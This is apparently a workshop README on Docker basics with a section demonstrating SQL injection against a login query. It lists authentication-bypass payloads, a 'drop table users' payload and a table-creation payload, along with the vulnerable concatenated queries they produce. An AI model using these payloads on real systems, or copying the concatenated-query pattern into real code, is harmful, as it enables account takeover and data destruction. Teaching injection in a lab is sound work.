# Docker Workshop with SQL Injection

## Images

| Image            | Link                              |
| ---------------- | --------------------------------- |
| **Linux Alpine** | https://hub.docker.com/_/alpine   |
| **Postgres**     | https://hub.docker.com/_/postgres |
| **Nginx**        | https://hub.docker.com/_/nginx    |

### 1. Dockerfile

É a receita passo a passo para criar uma imagem seja de um sistema operacional ou de uma aplicação.

### 2. Container

É a instância de uma imagem, ou seja, é a imagem em execução.

### 3. O que é o NODEJS

Nodejs é uma plataforma, e não é uma linguagem de programação

### 4. SQL Injection

```sql
' or ''='

' or login='usuario2

' or login='usuario3

--'; drop table users--

--'; create table new_users (login varchar(50),name varchar(50),password varchar(50))--
```

#### Como fica o comando final
```sql
SELECT * FROM users WHERE login = 'usuario1' AND password = '' or ''='';

SELECT * FROM users WHERE login = 'usuario1' AND password = '' or login='usuario2';

SELECT * FROM users WHERE login = 'usuario1' AND password = '' or login='usuario3';

SELECT * FROM users WHERE login = 'usuario1' AND password = ''; drop table users--';

SELECT * FROM users WHERE login = 'usuario1' AND password = ''; create table new_users (login varchar(50),name varchar(50),password varchar(50))--';
```